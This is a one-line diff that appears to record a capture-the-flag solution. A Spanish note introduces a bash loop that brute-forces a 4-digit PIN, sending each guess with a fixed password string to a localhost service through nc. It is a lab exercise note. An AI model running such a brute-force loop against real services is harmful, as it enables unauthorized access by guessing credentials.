@@ -1,0 +1,1 @@
+Realizar un script con fuerza para obtener la solucion for i in $(seq 1000 9999); do echo "Probando $i";echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"| nc localhost 30002;done >> resp.txt
